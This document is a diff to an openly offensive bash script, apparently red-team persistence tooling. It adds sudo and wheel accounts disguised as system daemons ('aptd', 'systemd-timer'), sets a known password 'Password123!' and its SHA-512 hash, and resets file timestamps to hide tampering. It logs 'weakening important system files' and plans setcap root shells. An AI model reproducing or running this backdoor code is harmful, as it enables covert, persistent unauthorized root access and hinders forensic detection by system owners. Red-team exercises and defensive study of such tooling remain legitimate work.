@@ -19,15 +19,15 @@ cecho () {
 	Purple='\033[0;35m'
 	Green='\033[0;32m'
 
-	CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"
+	local CechoUsage="${Red}[!] $0 usage: $0 <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"
 
 	if [ $# -ne 2 ]; then
 		echo -e "$CechoUsage"
 		return 1
 	fi
 
-	LogType=$1
-	LogMessage=$2
+	local LogType=$1
+	local LogMessage=$2
 
 	case $LogType in
 		"task")
@@ -62,7 +62,7 @@ get_timestamp () {
 		return 1
 	fi
 	
-	file="$1"
+	local file="$1"
 
 	if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
 		cecho error "Couldn't stat '$file'"
@@ -72,18 +72,30 @@ get_timestamp () {
 
 set_timestamp () {
 	if [ $# -ne 2 ]; then
-		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
+		cecho error "$0 usage: $0 <timestamp> <file>"
 		return 1
 	fi
 
-	timestamp="$1"
-	file="$2"
+	local timestamp="$1"
+	local file="$2"
 
 	if ! touch -t "$timestamp" "$file"; then
 		cecho error "Couldn't modify timestamp for '$file'"
 		return 1
 	else
 		cecho info "Modified timestamp for '$file'"
+	fi
+}
+
+create_sha512_password_hash () {
+	# mkpasswd usually found on debian systems
+	if which mkpasswd &>/dev/null; then
+		echo `echo -n "$USER_PASSWORD" | mkpasswd -s -m "sha512crypt"`
+	# Python crypt module only available in versions >= 3.3
+	elif which python3 &>/dev/null && [ `python3 --version | cut -d " " -f 2 | cut -d "." -f 1-2 | tr -d "."` -ge 33 ]; then
+		echo `python3 -c "import crypt; print(crypt.crypt('$USER_PASSWORD', crypt.mksalt(crypt.METHOD_SHA512)))"`
+	else
+		echo "$USER_PASSWORD_HASH_FALLBACK"
 	fi
 }
 
@@ -113,13 +125,16 @@ NEW_ROOT_USERS["ucp"]="ucp"
 declare -A NEW_SYSTEM_USERS
 NEW_SYSTEM_USERS["aptd"]="apt package daemon"
 NEW_SYSTEM_USERS["ntp"]="network time protocol daemon"
+NEW_SYSTEM_USERS["systemd-timer"]="systemd Unit Timer"
 declare -A NEW_NORMAL_USERS
-NEW_NORMAL_USERS["christian"]="youre not hacked i promise"
+NEW_NORMAL_USERS["`hostname | cut -d "." -f 1`"]=""
 NEW_NORMAL_USERS["ezekiel"]=""
 NEW_NORMAL_USERS["kordell"]=""
+NEW_NORMAL_USERS["christian"]="youre not hacked I promise"
 USER_HOME="/sbin"
 USER_SHELL="/usr/sbin/nologin"
-USER_PASSWORD="password123!"
+USER_PASSWORD='Password123!'
+USER_PASSWORD_HASH_FALLBACK='$6$WBBmpAfTATjQcsaX$Swrd6lone44mmh7PzfKpM6BXCKqC2huEdJo1jCfTUicPWfV8jkfPAC3ff3ZGIMa/B2zp/shGUDCRk0x0U20VH0' # echo -n 'Password123!' | mkpasswd -s -m "sha512crypt"
 
 
 
@@ -202,7 +217,7 @@ else
 	set_timestamp $bin_timestamp "/bin"
 fi
 
-cecho warning "To-DO: setcap binaries to provide root shells, similar to SUID!"
+cecho warning "TO-DO: setcap binaries to provide root shells, similar to SUID!"
 
 cecho done "Done weakening important system files"
 
@@ -347,7 +362,7 @@ else
 			cecho warning "User '$username' already exists, skipping"
 		else
 			# no-log-init, comment, shell, groups, username, password
-			useradd -l -c "${NEW_NORMAL_USERS[$username]}" -s "$USER_SHELL" -G "wheel,sudo,users" "$username" -p "$USER_PASSWORD" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" || cecho error "Could not create new normal user '$username'"
+			useradd -l -c "${NEW_NORMAL_USERS[$username]}" -s "$USER_SHELL" -G "wheel,sudo,users" "$username" -p "`create_sha512_password_hash`" && cecho info "Created new normal user '$username' with password '$USER_PASSWORD'" || cecho error "Could not create new normal user '$username'"
 		fi
 	done
 
